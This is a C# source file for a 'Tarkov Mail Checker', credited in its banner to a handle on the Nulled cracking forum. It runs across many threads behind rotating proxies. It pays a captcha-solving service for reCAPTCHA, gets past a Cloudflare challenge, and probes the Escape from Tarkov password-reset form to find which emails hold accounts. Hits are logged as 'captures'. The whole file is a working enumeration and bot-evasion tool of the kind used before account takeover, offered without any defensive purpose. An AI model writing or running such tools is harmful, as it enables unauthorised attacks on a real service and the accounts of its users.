using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Reflection.Metadata.Ecma335;
using System.Text.Json.Serialization;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Console = Colorful.Console;

namespace TarkovMailChecker
{
    class Program
    {
        static string captchaSolverKey = "";
        static async Task<string> SolveCaptcha(string html, string url)
        {
            Regex siteKeyRegex = new Regex(@"data-sitekey=.(.+?).>");
            string recaptchaSiteKey = siteKeyRegex.Match(html).Groups[1].Value.Replace($"\"", "");
            HttpWebRequest solveCaptchaRequest = (HttpWebRequest) WebRequest.Create(
                $"https://2captcha.com/in.php?key={captchaSolverKey}&method=userrecaptcha&googlekey={recaptchaSiteKey}&pageurl={url}&json=1");


            string captchaSolveRequestId = "";
            using(var response = await solveCaptchaRequest.GetResponseAsync())
            using (var responseReader = new StreamReader(response.GetResponseStream()))
            {
                string responseText = await responseReader.ReadToEndAsync();

                dynamic responseData = JsonConvert.DeserializeObject<dynamic>(responseText);

                if (responseData.status != 1)
                {
                    Console.WriteLine($"[Error] 2captcha returned an error, please check your key!", Color.Red);
                    Console.ReadLine();
                    Environment.Exit(0);
                }

                captchaSolveRequestId = (string)responseData.request;
            }
            
            while(true)
            {
                await Task.Delay(5000);

                HttpWebRequest solvedCaptchaRequest = (HttpWebRequest) WebRequest.Create(
                    $"https://2captcha.com/res.php?key={captchaSolverKey}&action=get&id={captchaSolveRequestId}");
                
                using(var response = await solvedCaptchaRequest.GetResponseAsync())
                using (var responseReader = new StreamReader(response.GetResponseStream()))
                {
                    string responseText = await responseReader.ReadToEndAsync();
                    
                    if(responseText == "CAPCHA_NOT_READY") continue;

                    return responseText.Replace("OK|", "");
                }
            }

            return null;
        }

        static async Task<bool> CheckEmail2(string html, WebProxy proxy, CookieContainer cookies, string email)
        {
            
            Regex regex = new Regex(@"id=.token..+?value=.(.+?).\s");

            string token = regex.Match(html).Groups[1].Value;

            HttpWebRequest request =
                (HttpWebRequest) WebRequest.Create($"https://www.escapefromtarkov.com/reset-password");

            request.CookieContainer = cookies;
            request.Proxy = proxy;
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.Referer = "https://www.escapefromtarkov.com/reset-password";
            request.Host = "www.escapefromtarkov.com";
            request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
            request.UserAgent =
                "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0";
            request.AllowAutoRedirect = false;

            string solvedCaptcha = await SolveCaptcha(html, "https://www.escapefromtarkov.com/reset-password");
            using (var requestStream = await request.GetRequestStreamAsync())
            {
                await new FormUrlEncodedContent(new List<KeyValuePair<string, string>>()
                {
                    new KeyValuePair<string, string> ("email", email),
                    new KeyValuePair<string, string>("g-recaptcha-response", ""),
                    new KeyValuePair<string, string>("g-recaptcha-response", solvedCaptcha),
                    new KeyValuePair<string, string>("signup", "submit"),
                    new KeyValuePair<string, string>("form_id", "User-PassResetForm"),
                    new KeyValuePair<string, string>("token", token)
                }).CopyToAsync(requestStream);
            }

            try
            {
                using (var response = await request.GetResponseAsync())
                {
                    return false;
                }
            }
            catch (Exception)
            {
                return true;
            }
            
        }
        
        static async Task<bool> CheckEmail(string email, WebProxy proxy = null, CookieContainer cookies = null)
        {
            if (cookies == null) cookies = new CookieContainer();
            HttpWebRequest request =
                (HttpWebRequest) WebRequest.Create($"https://www.escapefromtarkov.com/reset-password");

            request.Proxy = proxy;
            request.CookieContainer = cookies;
            request.Host = "www.escapefromtarkov.com";
            request.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
            request.UserAgent =
                "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0";


            try
            {

                using(var response = await request.GetResponseAsync())
                using (var responseReader = new StreamReader(response.GetResponseStream()))
                {
                    string responseText = await responseReader.ReadToEndAsync();


                    return await CheckEmail2(responseText, proxy, cookies, email);

                }
            }
            catch (WebException ex)
            {
                using (var responseReader = new StreamReader(ex.Response.GetResponseStream()))
                {
                    string responseText = await responseReader.ReadToEndAsync();

                    if (responseText.Contains("nginx"))
                        throw;

                    string rValue = new Regex(@"name=.r..+?value=.(.+?).>").Match(responseText).Groups[1].Value;
                    string rayValue = new Regex(@"data-ray=.(.+?).\s").Match(responseText).Groups[1].Value;
                    string chlValue = new Regex(@"action=.+?__cf_chl_captcha_tk__=(.+?).\s").Match(responseText)
                        .Groups[1].Value;

                    string recaptchaResponse =
                        await SolveCaptcha(responseText, "https://www.escapefromtarkov.com/reset-password");

                    HttpWebRequest cloudflareBypassRequest =
                        (HttpWebRequest) WebRequest.Create(
                            $"https://www.escapefromtarkov.com/reset-password?__cf_chl_captcha_tk__={chlValue}");

                    cloudflareBypassRequest.CookieContainer = cookies;
                    cloudflareBypassRequest.Proxy = proxy;
                    cloudflareBypassRequest.Method = "POST";
                    cloudflareBypassRequest.ContentType = "application/x-www-form-urlencoded";
                    cloudflareBypassRequest.Referer = "https://www.escapefromtarkov.com/reset-password";
                    cloudflareBypassRequest.Host = "www.escapefromtarkov.com";
                    cloudflareBypassRequest.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                    cloudflareBypassRequest.UserAgent =
                        "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0";

                    using (var requestStream = await cloudflareBypassRequest.GetRequestStreamAsync())
                    {
                        await new FormUrlEncodedContent(new Dictionary<string, string>()
                        {
                            { "r", rValue},
                            {"cf_captcha_kind", "re"},
                            { "id", rayValue},
                            {"g-recaptcha-response", recaptchaResponse}
                        }).CopyToAsync(requestStream);
                    }

                    using (var response = await cloudflareBypassRequest.GetResponseAsync())
                    using(var bypassReader = new StreamReader(response.GetResponseStream()))
                    {
                        string bypassText = await responseReader.ReadToEndAsync();

                        return await CheckEmail(email, proxy, cookies);
                    }
                }
                
            }
        }
        
        

        static void Main(string[] args)
        {
            Console.WriteLine($"Tarkov Mail Checker - by Aesir - [ Nulled: SickAesir | Telegram: @sickaesir | Discord: Aesir#1337 ]", Color.Cyan);

            List<WebProxy> proxies = new List<WebProxy>();
            if (!File.Exists($"proxies.txt"))
            {
                Console.WriteLine($"[Info] The proxy file proxies.txt was not found, switched to proxyless mode!",
                    Color.Orange);
            }
            else
            {
                string[] proxyLines = File.ReadAllLines("proxies.txt");

                foreach (var line in proxyLines)
                {
                    proxies.Add(new WebProxy()
                    {
                        Address = new Uri($"http://{line}")
                    });
                }

                Console.WriteLine($"[Info] Loaded {proxies.Count} proxies!", Color.Green);
            }


            ConcurrentQueue<string> mails = new ConcurrentQueue<string>();
            if (!File.Exists("mails.txt"))
            {
                Console.WriteLine($"[Error] The mails file mails.txt was not found!", Color.Red);
                Console.ReadLine();
                return;
            }
            else
            {
                string[] lines = File.ReadAllLines("mails.txt");

                foreach (var line in lines)
                    mails.Enqueue(line);

                Console.WriteLine($"[Info] Loaded {mails.Count} mails!", Color.Green);
            }

            Console.Write($"[Config] Input your 2captcha API key: ", Color.Orange);
            captchaSolverKey = Console.ReadLine();


            Console.Write($"[Config] Input the thread count: ", Color.Orange);
            int threadCount = int.Parse(Console.ReadLine());

            List<Thread> threads = new List<Thread>();

            object locker = new object();
            for (int i = 0; i < threadCount; i++)
            {
                Thread thread = new Thread(() =>
                {
                    while (mails.TryDequeue(out var email))
                    {
                        WebProxy proxy = null;

                        if (proxies.Count > 0)
                        {
                            proxy = proxies[
                                new Random((int) (DateTime.Now.Ticks & 0xFFFFFFFF)).Next(0, proxies.Count - 1)];
                        }

                        bool result = false;
                        try
                        {
                            result = CheckEmail(email, proxy, null).Result;
                        }
                        catch (Exception)
                        {
                            mails.Enqueue(email);
                        }

                        lock (locker)
                        {
                            Console.Title = $"Left: {mails.Count}";
                            if (result)
                            {
                                File.AppendAllText("captures.txt", email);
                                Console.WriteLine($"[Capture] {email}", Color.Green);
                            }
                        }
                    }
                });

                thread.Start();

                threads.Add(thread);
            }

            foreach (var thread in threads)
                thread.Join();
            
        }
    }
}